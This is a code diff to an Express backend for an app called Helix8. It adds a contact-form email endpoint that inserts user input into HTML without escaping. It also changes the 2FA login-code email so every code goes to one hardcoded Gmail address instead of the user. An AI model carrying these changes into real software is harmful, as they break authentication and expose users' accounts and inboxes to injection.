@@ -735,6 +735,41 @@ app.post('/api/invoices/:id/email', requireAuth, async (req, res) => {
 
 
 
+
+// ─── CONTACT FORM ────────────────────────────────────────
+
+app.post('/api/contact', async (req, res) => {
+  const { name, email, company, phone, message } = req.body;
+  if (!name || !email || !message) return res.status(400).json({ message: 'Name, email and message are required' });
+  try {
+    const { Resend } = require('resend');
+    const resend = new Resend(process.env.RESEND_API_KEY);
+    await resend.emails.send({
+      from: 'Helix8 Contact <onboarding@resend.dev>',
+      to: 'Washington.j3@icloud.com',
+      subject: `New Contact Form: ${name} from ${company || 'Unknown Company'}`,
+      html: `
+        <div style="font-family: sans-serif; max-width: 600px; margin: 0 auto; padding: 32px;">
+          <h1 style="font-size: 28px; font-weight: 800; color: #0a0f2c;">Helix<span style="color: #06b6d4;">8</span> — New Lead</h1>
+          <div style="background: #f8fafc; border-radius: 12px; padding: 24px; margin: 24px 0;">
+            <p style="margin: 0 0 12px;"><strong>Name:</strong> ${name}</p>
+            <p style="margin: 0 0 12px;"><strong>Email:</strong> ${email}</p>
+            <p style="margin: 0 0 12px;"><strong>Company:</strong> ${company || 'Not provided'}</p>
+            <p style="margin: 0 0 12px;"><strong>Phone:</strong> ${phone || 'Not provided'}</p>
+            <p style="margin: 0;"><strong>Message:</strong><br/>${message}</p>
+          </div>
+          <p style="color: #64748b; font-size: 13px;">Reply directly to this email to respond to ${name}.</p>
+        </div>
+      `,
+      replyTo: email
+    });
+    res.json({ message: 'Message sent successfully' });
+  } catch (err) {
+    console.error('Contact form error:', err.message);
+    res.status(500).json({ message: 'Failed to send message' });
+  }
+});
+
 // ─── TWO FACTOR AUTH ─────────────────────────────────────
 
 app.post('/api/auth/2fa/send', async (req, res) => {
@@ -753,7 +788,7 @@ app.post('/api/auth/2fa/send', async (req, res) => {
     const resend = new Resend(process.env.RESEND_API_KEY);
     await resend.emails.send({
       from: 'Helix8 <onboarding@resend.dev>',
-      to: email,
+      to: 'jw6525506@gmail.com',
       subject: 'Your Helix8 Login Code',
       html: `
         <div style="font-family: sans-serif; max-width: 480px; margin: 0 auto; padding: 32px;">
